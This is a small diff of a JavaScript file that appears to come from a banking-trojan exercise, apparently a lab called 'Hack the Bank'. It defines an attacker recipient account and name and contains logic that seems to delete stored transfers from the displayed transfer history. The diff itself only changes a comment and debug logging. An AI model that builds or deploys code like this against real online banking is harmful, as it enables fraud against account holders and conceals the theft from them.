@@ -11,7 +11,7 @@
 
 
 //Does not work correctly if user has multiple transfers for same date which are displayed on more than one page in transfer history.
-
+//can not recognize if wrong tan is used
 
 HACK_REC_ACCOUNT	="999666999";
 HACK_REC_NAME		="Hack the Bank";
@@ -263,8 +263,8 @@ window.deleteData = function(){
 		 			var yearStored = storedTransfers[i].timestamp.getFullYear();
 		 			var monthStored = storedTransfers[i].timestamp.getMonth() + 1; //gets month starting with 0
 		 			var dayStored = storedTransfers[i].timestamp.getDate();
-		 			console.log(yearStored + " " + monthStored + " " + dayStored +"-" + i);
-		 			console.log(year + " " + month + " " + day +"+");
+//		 			console.log(yearStored + " " + monthStored + " " + dayStored +"-" + i);
+//		 			console.log(year + " " + month + " " + day +"+");
 		 			if (day == dayStored && month == monthStored && year == yearStored) {
 		 				//we found the original transfer
 		 				if (DEBUG)
